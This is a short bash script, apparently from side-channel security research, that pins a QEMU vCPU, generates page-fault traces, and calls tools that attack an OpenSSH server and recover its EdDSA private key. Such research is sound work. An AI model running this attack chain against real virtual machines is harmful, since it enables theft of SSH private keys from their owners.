#!/bin/bash

set -e

#base directory for the page fault attack tools
TOOLS_BASE="../../"
if [ "" = "$TOOLS_BASE" ]
then
  echo "Please set point TOOLS_BASE variable to the folder containing the binaries build by this package"
  exit
fi
#Used by tools to trigger victim behaviour that we want to analyze
TRIGGER_URI="ssh://attacker@localhost:2223"

#proudly copy pasted from https://stackoverflow.com/questions/192249/how-do-i-parse-command-line-arguments-in-bash
POSITIONAL=()
while [[ $# -gt 0 ]]; do
  key="$1"

  case $key in
    -n|--no-rip)
      GET_RIP=false
      shift # past value
      ;;
    -c|--cpu)
      CPU="$2"
      shift
      shift
      ;;
    *)    # unknown option
      POSITIONAL+=("$1") # save it in an array for later
      shift # past argument
      ;;
  esac
done

set -- "${POSITIONAL[@]}" # restore positional parameters

if [ -z "$CPU" ]; then
        CPU="-1"
fi

if [ -z "$GET_RIP" ]; then
        GET_RIP="true"
fi

echo "GET_RIP        = ${GET_RIP}"
echo "CPU            = ${CPU}"

sudo qemu-affinity $(pidof qemu-system-x86_64 ) -k $CPU
printf "###\nPinned vcpu thread to CPU $CPU\n###\n"


#Switch between different trace generator backends
TRACE_GENERATOR="${TOOLS_BASE}/pfBatchTraceGenerator"
#TRACE_GENERATOR="${TOOLS_BASE}/pfTraceGenerator"
printf "###\nBuild Allow Set\n###\n"
sudo ${TRACE_GENERATOR} -retrack=false -tracking execute -iterations 1 -format json -cpu ${CPU} -getRIP=${GET_RIP}  -triggerURI ${TRIGGER_URI}

printf "###\nGenerating Attack Trace\n###\n"
sudo ${TOOLS_BASE}/pfOSSHAttackEdDSA -triggerURI ${TRIGGER_URI} #-debugLog

printf "###\nKey Recovery\n###\n"
${TOOLS_BASE}/pfOSSHRecoverEdDSAKey -debugLog=false
